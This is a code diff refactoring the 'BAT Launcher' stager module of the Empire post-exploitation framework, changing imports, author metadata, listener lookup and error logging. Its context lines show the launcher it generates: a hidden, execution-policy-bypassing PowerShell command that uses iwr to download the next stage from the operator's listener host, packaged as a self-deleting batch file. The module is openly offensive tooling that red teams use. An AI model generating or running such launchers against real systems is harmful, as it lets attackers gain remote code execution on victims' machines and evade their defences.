@@ -1,17 +1,25 @@
 from __future__ import print_function
 
 import base64
+import logging
 from builtins import object
 
-from empire.server.common import helpers
+from empire.server.core.db.base import SessionLocal
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "BAT Launcher",
-            "Author": ["@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                }
+            ],
             "Description": "Generates a self-deleting .bat launcher for Empire. Only works with the HTTP and HTTP COM listeners.",
             "Comments": [""],
         }
@@ -82,9 +90,8 @@ class Stager(object):
         else:
             obfuscate = False
 
-        host = self.mainMenu.listeners.activeListeners[listener_name]["options"][
-            "Host"
-        ]["Value"]
+        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
+        host = listener.options["Host"]["Value"]
 
         launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
 
@@ -108,7 +115,7 @@ class Stager(object):
         launcher = launcher + launcher_end
 
         if host == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
 
         else:
